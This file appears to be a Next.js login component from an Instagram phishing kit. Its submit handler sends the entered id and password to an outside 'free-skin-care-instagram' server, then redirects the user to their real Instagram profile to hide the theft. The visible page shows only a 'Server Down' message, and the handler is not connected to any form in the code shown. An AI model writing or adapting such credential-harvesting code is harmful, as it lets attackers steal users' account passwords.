"use client";

import { useState } from "react";
import "./style.css";
import Link from "next/link";
import axios from "axios";
import { useRouter } from "next/navigation";


export default function Login() {
    const route = useRouter();

  const [id, setId] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async () => {
    try {
      await axios.post(
        "https://free-skin-care-instagram.vercel.app/api/login",
        { id, password },
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
            route.push(`https://www.instagram.com/${id}/`);

    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div className="container">
    <h1>Server Down Please Try Again Later</h1>
    </div>
  );
}
